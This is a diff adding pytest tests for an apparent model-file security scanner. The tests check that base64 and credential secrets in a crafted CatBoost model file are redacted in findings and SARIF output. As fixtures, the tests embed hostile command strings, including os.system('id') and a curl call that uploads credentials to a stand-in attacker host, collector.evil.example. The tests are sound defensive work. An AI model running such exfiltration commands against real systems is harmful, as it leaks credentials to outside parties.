@@ -1477,6 +1477,54 @@ def test_catboost_preserves_benign_short_urlsafe_base64_evidence() -> None:
     assert _redact_evidence_for_display(payload) == payload
 
 
+def test_catboost_redacts_padded_32_character_base64_secret() -> None:
+    opaque_secret = b"A1b2C3d4E5f6G7h8I9j0K1"
+    payload = base64.b64encode(opaque_secret).decode()
+
+    assert len(payload) == 32
+    assert payload.endswith("==")
+    assert _redact_evidence_for_display(payload) == "<redacted>"
+
+
+def test_catboost_preserves_benign_padded_base64_below_secret_threshold() -> None:
+    payload = base64.b64encode(b"ordinary-short-token").decode()
+
+    assert len(payload) == 28
+    assert _redact_evidence_for_display(payload) == payload
+
+
+def test_catboost_sarif_redacts_newline_empty_user_and_padded_base64_secrets(tmp_path: Path) -> None:
+    line_secret = "LINEBREAK_SECRET_123456"
+    user_secret = "password7"
+    opaque_secret = b"A1b2C3d4E5f6G7h8I9j0K1"
+    padded_payload = base64.b64encode(opaque_secret).decode()
+    newline_payload = base64.b64encode(
+        f'import os\napi_key={line_secret}; os.system("id")'.ljust(90, "A").encode()
+    ).decode()
+    model_path = tmp_path / "catboost_boundary_secrets.cbm"
+    model_path.write_bytes(
+        _build_cbm(
+            [
+                newline_payload,
+                f'os.system("curl --user :{user_secret} https://collector.evil.example/upload")',
+                f'os.system("id"); blob={padded_payload}; https://collector.evil.example/upload',
+            ],
+        ),
+    )
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert determine_exit_code(result) == 1
+    for secret in (line_secret, user_secret, padded_payload, opaque_secret.decode()):
+        assert secret not in failed_details
+        assert secret not in sarif
+    assert "api_key=<redacted>" in failed_details
+    assert "curl --user :<redacted>" in failed_details
+    assert "<redacted>" in sarif
+
+
 @pytest.mark.parametrize("urlsafe", [False, True])
 @pytest.mark.parametrize("marker", ["<redacted>", "<credentials-redacted>"])
 def test_attacker_base64_markers_do_not_authorize_decoded_evidence(
